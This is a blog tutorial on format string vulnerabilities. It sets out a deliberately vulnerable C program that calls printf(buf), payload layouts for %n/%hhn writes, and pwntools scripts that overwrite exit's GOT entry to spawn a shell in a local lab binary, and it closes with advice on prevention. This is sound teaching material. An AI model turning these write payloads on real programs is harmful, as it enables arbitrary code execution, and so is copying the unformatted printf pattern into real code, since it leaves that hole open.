---
layout: post
title:  "Exploiting Format String bug"
date:   2020-06-11
categories: ctf
description: Basic format string bug
tags: ctf-writeup hackthebox
---

did you know , we can write something on memory by using printf ? yes we can.
in this post i will try to explain how printf works and how we can exploit format string
vulnerability on printf()

### How printf() works

in C we can print something using printf , for example:
{% highlight C %}
#include <stdio.h>
void main(){
  int x = 1337;
  char buf[0xff] = "bro";
  printf("%d from %s" , x , buf);
}
{% endhighlight %}

if we compile the source code above, the output will be like this


<img src="/images/format-string/2020-06-11-193407_256x46_scrot.png" />

we can use some format for printf something

    %d  for integer
    %s  for char
    %l  for long int
    %ll   for long long int
    %p  for pointer in hexadecimal
    %o  for octal
    %x unsigned hexadecimal
    %n write something?

we can write some data on memory by using %n format for 4 byte and here is the other:

    hhn  : write 1 byte
    hn   : write 2 byte
    n    : write 4 byte

the exploit for 64bit and 32bit architecture is slightly different
because in 64bit we have to deal with null char "\x00" , for example

on 32bit our exploit will look like this:

    [padding][address]%[value]c%[index]$[write_type]

while on 64 bit our exploit will look like this:

    %[value]c%[index]$[write_type][padding][address]

as you can see , on 64bit architecture our address will placed at the end of the payload ,
it's because we are dealing with null char , for example if we want to write on address 0xdeadbabe

on 32bit ```0xdeadbabe``` will look like this:

    \xbe\xba\xad\xde

while on 64bit will look like this:

    \xbe\xba\xad\xde\x00\x00\x00\x00

on 64bit there is null char on the address , so we have to place the address at the end of the payload
because if printf found a null char '\x00' it will simply terminate to print , i assume you already know about little endian

### Exploitation

for example to exploit format string and doing arbitrary write on an address , this is a vulnerable program you can exploit
{%highlight c%}
#include <stdio.h>
#include <stdlib.h>

void get_shell(){
        system("/bin/sh");
}

void main(){
        char buf[100];
        read(0 , buf , sizeof(buf));
        printf(buf);
        exit(1);
}
{% endhighlight %}

compile the source with flags to compile it as 32bit architecture and disable pie protection:

    gcc source.c -o bug -no-pie -m32

as you can see , the bug is on printf , because we don't use any fomat to printf value from buffer , so we can simply
leak any value on the stack by input "%p"

<img src="/images/format-string/2020-06-11-202053_323x70_scrot.png" />

our goal is to overwrite GOT  exit() to get_shell() address by using format string bug ,
why exit ?  because if we look at the binary protection :

<img src="/images/format-string/2020-06-11-202816_291x131_scrot.png" />

because on 32bit architecture gcc will disable relro protection by default , so it's possible to us to overwrite GOT libc address
to somewhere on memory , in this case get_shell() , firstly we have to determine our input index on the stack

<img src="/images/format-string/2020-06-11-203741_495x65_scrot.png" />

according from the image above , our input is on index 6 in the stack , because ```0x41414141``` is our input```AAAA```
now we have to determine exit got address by using ```readelf```

<img src="/images/format-string/2020-06-11-204235_472x214_scrot.png" />

exit got address on ```0x0804c018``` now we have to determine get_shell() address

<img src="/images/format-string/2020-06-11-204543_648x398_scrot.png" />

get_shell on address ```0x080491F6``` , now we have to craft our exploit

{% highlight python %}
from pwn import *
exit_got = 0x0804c018
get_shell = 0x080491F6
r = process("./chall")
gdb.attach(r)

p = "AAAA"
p += p32(exit_got)
p += "%{}c%7$hhn".format((0x41 - 8) & 0xff)

r.sendline(p)
r.interactive()
{% endhighlight %}

so we want to write 0x41 on exit_got address , we use hhn because we only write 1 byte on memory ,
we have to substract by 8 , why 8 ? because we already write 8 byte on the stack ,
and AND with 0xff because we only write 1 byte on the memory
run the exploit and check the got address

<img src="/images/format-string/2020-06-11-205616_451x155_scrot.png" />


we successfully write 0x41 on exit got  , now we want to write 0x91f6 on exit_got address so we can jump
to get_shell() , our exploit should look like :

{% highlight python %}
from pwn import *
exit_got = 0x0804c018
get_shell = 0x080491F6
r = process("./chall")
gdb.attach(r)
p = "AAAA"
p += p32(exit_got)
p += p32(exit_got+1)
p += "%{}c%7$hhn".format((0xf6 - 12) & 0xff)
p += "%{}c%8$hhn".format((0x91 - 0xf6) & 0xff)

r.sendline(p)
r.interactive()
{% endhighlight %}

as you can see , we have to substract our write value by our last value , we got ```12``` becase
we already write 12 byte to stack and we want to write 0xf6 to exit_got address , after that
we substract 0x91 by - 0xf6 because we already write 0xf6 to exit_got address , and for 7 , we got 7
becuase ```AAAA``` is on index 6 so exit_got address will on index 7 and exit_got+1 on index 8

<img src="/images/format-string/2020-06-11-210815_598x540_scrot.png" />
<img src="/images/format-string/2020-06-11-211313_720x134_scrot.png" />

now we successfully overwrite exit got address to ```get_shell()```

### prevent format string bugs

to prevent this bug , you have to specify the format before print any data ,
because attacker can leak or write data on stack by using this bug , for example :
{% highlight c %}
printf("%s" , buf);
printf("%x",val);
printf("%d",val2);
{% endhighlight %}
